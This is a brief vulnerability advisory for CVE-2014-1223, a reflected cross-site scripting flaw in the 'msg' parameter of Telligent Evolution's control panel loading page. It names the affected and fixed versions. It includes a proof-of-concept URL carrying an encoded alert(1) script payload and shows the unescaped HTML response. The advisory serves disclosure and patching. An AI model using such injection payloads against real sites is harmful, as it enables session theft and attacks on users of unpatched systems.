Subject: CVE-2014-1223 - Cross-site Scripting in Telligent
	Evolution

Vulnerability title: Cross-site Scripting in Telligent Evolution
CVE: CVE-2014-1223
Vendor: Telligent
Product: Evolution
Affected version: 7.5.0.32466
Fixed version: 7.6.7.36651
Reported by: Jerzy Kramarz

Details:
It is possible for an attacker to inject JavaScript by manipulating the
'msg' parameter such that the JavaScript from the manipulated request is
returned in the response. The following is an example URL which would
trigger this vulnerability:

http://host/controlpanel/loading.aspx?msg=1238c696%253cscript%253ealert%25281%2529%253c%252fscript%253e35c38a5e263

The above URL would produce the following source code returned to the user:

<div class="CommonContentArea"> <div class="CommonContent"> <table
cellspacing="0" cellpadding="4" border="0"> <tr> <td><img
src="/community/utility/spinner.gif" width="16" height="16"
border="0"></td> <td>1238c696<script>alert(1)</script>35c38a5e263</td>
</tr> </table> </div> </div> </p>
